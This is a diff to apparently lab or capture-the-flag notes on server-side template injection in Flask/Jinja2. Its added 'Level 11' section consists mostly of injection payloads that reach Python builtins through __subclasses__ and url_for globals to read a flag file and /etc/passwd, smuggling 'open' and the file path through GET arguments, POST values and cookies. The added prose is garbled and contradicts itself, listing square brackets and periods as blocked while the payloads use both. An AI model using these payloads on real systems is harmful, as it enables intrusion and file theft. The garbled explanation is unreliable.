@@ -3,7 +3,6 @@
 
 ## Fingerprinting
 * When we input `{{7*'7'}}`, Twig would output `49`, while Jinja2/Flask output `7777777`
-* 
 
 
 ## Flask-Lab
@@ -173,3 +172,33 @@
 {{ url_for.__globals__.__builtins__.locals()}}
 ```
 * Once again, we're accessing the [built-in python functions](https://docs.python.org/3/library/functions.html), one of which being `locals()`, which shows the local symbol table 
+
+### Level 11
+* This level was tough. Among the list of blocked characters were:
+	* Single quotes
+	* Double quotes
+	* Addition sign
+	* Square brackets
+	* Periods
+
+* 
+```python3
+{{ url_for.__globals__.__builtins__.open('flag').read() }}
+
+
+```
+
+payload as follows
+
+GETThe way, utilize request.argsPass parameters
+
+{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}&arg1=open&arg2=/etc/passwd
+	
+POSTThe way, utilize request.valuesPass parameters
+
+{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}
+post:arg1=open&arg2=/etc/passwd
+CookieThe way, utilize request.cookiesPass parameters
+
+{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
+Cookie:arg1=open;arg2=/etc/passwd
